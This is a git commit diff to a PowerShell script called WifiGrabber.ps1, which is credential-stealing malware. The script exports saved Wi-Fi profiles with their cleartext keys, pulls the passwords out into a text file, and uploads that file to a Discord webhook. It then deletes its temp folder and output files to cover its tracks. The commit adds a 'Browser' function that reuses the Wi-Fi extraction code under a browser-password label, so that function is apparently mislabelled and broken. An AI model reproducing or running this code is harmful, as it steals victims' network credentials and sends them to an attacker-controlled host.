f7833af2308b6a61b1a9e083a6d477451a5a3055
SebaTheProgrammer <119673781+SebaTheProgrammer@users.noreply.github.com>
2023-03-10 12:07:30 +0100

    Update WifiGrabber.ps1

--- WifiGrabber.ps1
+++ WifiGrabber.ps1
@@ -33,13 +33,15 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl  -Method Post
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUrl}
 }
 
-function Wifi {
+function Wifi 
+{
 New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"
 Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear
 Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $desktop\0.txt
 Upload-Discord -file "$desktop\0.txt" -text "Wifi password :"
 Set-Location -Path "$env:temp"
 Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
+}
 }
 
  function Del-Nirsoft-File 
@@ -55,4 +57,12 @@ function version-av {
   Upload-Discord -file "C:\Temp\resultat.txt" -text "Anti-spyware version:"
   cd C:\
   rmdir -R \temp
+}
+
+function Browser
+{
+Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $desktop\export.txt
+Upload-Discord -file "$desktop\export.txt" -text "Browser password :"
+Set-Location -Path "$env:temp"
+Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\export.txt
 }
